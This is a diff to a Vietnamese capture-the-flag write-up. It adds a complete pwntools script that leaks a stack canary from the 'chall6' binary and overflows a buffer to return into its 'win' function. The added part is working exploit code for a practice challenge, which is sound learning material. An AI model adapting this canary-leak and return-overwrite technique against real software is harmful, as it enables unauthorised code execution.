@@ -156,12 +156,33 @@ Canary leak:  0x756f590a6de73600
 ```
 * Xây dựng payload tiếp tục overwrite biến `feedback`
 ```python
-payload  = b'A'*(0x128 - 0x20)
+payload  = b'A'*(296 - 32)
 payload += p64(canary)
 payload += p64(0) # fake rbp
 payload += p64(exe.sym['win']+8)
 p.sendafter(b'Your feedback: ', payload)
+```
+### Script hoàn chỉnh
+```python
+#!/usr/bin/python3
 
+from pwn import *
+
+exe = ELF("./chall6", checksec = False)
+p = process("./chall6")
+
+p.sendafter(b'Your name: ',b'A'*(296 + 1))
+p.recvuntil(b'A'*(296 + 1))
+canary = u64(b'\0' + p.recv(7))
+print("Canary leak: ",hex(canary))
+
+payload  = b'A'*(296-32)
+payload += p64(canary)
+payload += p64(0) # fake rbp
+payload += p64(exe.sym['win']+8)
+
+p.sendafter(b'Your feedback: ', payload)
+p.interactive()
 ```
 
 
